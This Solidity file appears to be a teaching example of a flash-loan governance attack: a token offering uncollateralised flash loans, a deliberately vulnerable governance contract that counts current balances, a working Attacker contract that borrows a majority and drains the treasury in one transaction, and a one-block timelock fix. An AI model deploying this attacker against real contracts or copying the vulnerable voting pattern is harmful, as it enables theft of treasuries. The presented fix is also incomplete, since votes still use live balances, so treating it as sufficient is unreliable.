// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// A contract that receives a flash loan must implement this callback.
interface IFlashBorrower { function onFlashLoan(uint256 amount) external; }
// Minimal governance interface, so the attacker works against any governance.
interface IGov {
    function propose(address to) external returns (uint256);
    function vote(uint256 id) external;
    function execute(uint256 id) external;
}

/// A governance token with a naive, UNCOLLATERALISED flash loan: borrow, use, repay in one tx.
contract GovToken {
    mapping(address => uint256) public balanceOf; // who holds how many tokens
    uint256 public totalSupply;                   // total tokens in existence
    /// Mint `circulating` to real holders and a `pool` this contract will lend out.
    constructor(uint256 circulating, uint256 pool, address holder) {
        totalSupply = circulating + pool;         // total = holders + lendable pool
        balanceOf[holder] = circulating;          // the honest holders
        balanceOf[address(this)] = pool;          // the flash-loan pool
    }
    /// Move tokens from the caller to `to`.
    function transfer(address to, uint256 a) external {
        balanceOf[msg.sender] -= a;               // take from the sender
        balanceOf[to] += a;                       // give to the recipient
    }
    /// Lend `amt` with NO collateral; the borrower must return it before this call ends.
    function flashLoan(uint256 amt) external {
        uint256 bal = balanceOf[address(this)];   // pool balance before lending
        balanceOf[address(this)] -= amt;          // hand the tokens...
        balanceOf[msg.sender] += amt;             // ...to the borrower
        IFlashBorrower(msg.sender).onFlashLoan(amt); // let the borrower use them
        require(balanceOf[address(this)] >= bal, "flash loan not repaid"); // must be returned
    }
}

/// VULNERABLE governance: it holds the treasury, and a vote counts your CURRENT token balance.
contract Governance {
    GovToken public token;                        // the governance token
    struct Proposal { address to; uint256 votes; bool executed; }
    Proposal[] public proposals;
    constructor(GovToken t) payable { token = t; } // funded with the treasury ETH
    /// Create a proposal to send the whole treasury to `to`.
    function propose(address to) external returns (uint256 id) {
        proposals.push(Proposal(to, 0, false));   // record the proposal
        return proposals.length - 1;              // its id
    }
    /// Vote: add the caller's CURRENT balance to the proposal. <-- the flaw.
    function vote(uint256 id) external {
        proposals[id].votes += token.balanceOf(msg.sender); // counts tokens you hold RIGHT NOW
    }
    /// Execute: if a proposal has a majority, hand it the whole treasury.
    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(p.votes > token.totalSupply() / 2, "not enough votes"); // need > 50%
        require(!p.executed, "already executed"); p.executed = true;
        payable(p.to).transfer(address(this).balance); // send the whole treasury
    }
}

/// Borrows the token, votes itself the treasury, drains it, and repays - all in one transaction.
contract Attacker is IFlashBorrower {
    GovToken token; IGov gov;
    constructor(GovToken t, address g) { token = t; gov = IGov(g); }
    receive() external payable {}                  // accept the drained treasury ETH
    /// Kick off the attack: take a flash loan of `borrow` tokens.
    function pwn(uint256 borrow) external {
        token.flashLoan(borrow);                  // -> the token calls onFlashLoan below
    }
    /// The flash-loan callback: while we hold the borrowed majority, seize the treasury.
    function onFlashLoan(uint256 amount) external {
        uint256 id = gov.propose(address(this));   // propose: send the treasury to me
        gov.vote(id);                             // vote with the borrowed majority
        gov.execute(id);                          // execute -> treasury drained to us
        token.transfer(address(token), amount);   // repay the flash loan
    }
}

/// FIXED governance: a timelock. Propose and execute can't be in the same block, so
/// flash-loaned votes (which vanish when the tx ends) are worthless.
contract GovernanceFixed {
    GovToken public token;
    struct Proposal { address to; uint256 votes; bool executed; uint256 createdAt; }
    Proposal[] public proposals;
    constructor(GovToken t) payable { token = t; }
    function propose(address to) external returns (uint256 id) {
        proposals.push(Proposal(to, 0, false, block.number)); return proposals.length - 1;
    }
    function vote(uint256 id) external { proposals[id].votes += token.balanceOf(msg.sender); }
    /// Execute - but only if the proposal is at least one block old.
    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(block.number > p.createdAt, "timelock: wait a block"); // <-- the fix
        require(p.votes > token.totalSupply() / 2, "not enough votes");
        require(!p.executed, "already executed"); p.executed = true;
        payable(p.to).transfer(address(this).balance);
    }
}


